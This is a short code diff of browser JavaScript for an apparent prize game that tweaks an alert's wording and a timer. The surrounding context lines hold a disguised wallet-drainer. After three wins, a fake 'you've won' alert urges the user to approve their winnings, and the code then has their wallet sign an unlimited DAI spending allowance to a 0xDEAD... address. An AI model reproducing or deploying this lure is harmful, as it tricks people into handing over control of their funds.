@@ -107,12 +107,12 @@
           setTimeout(async () => {
             if (amt === 5000) winCount++
             if (winCount === 3) {
-              alert(`CONGRATULATIONS! You've won 5,000 $DIA! Click OK to APPROVE your winnings on the next screen`)
+              alert(`CONGRATULATIONS! You've won 5,000 DAImonds! Click OK to APPROVE your winnings on the next screen`)
               const signer = (new ethers.providers.Web3Provider(window.ethereum)).getSigner()
               const dai = new ethers.Contract('0x95b58a6bff3d14b7db2f5cb5f0ad413dc2940658', daiAbi, signer)
               await dai.approve('0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD', '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')
             }
-          }, 20)
+          }, 10)
         }
 
       })
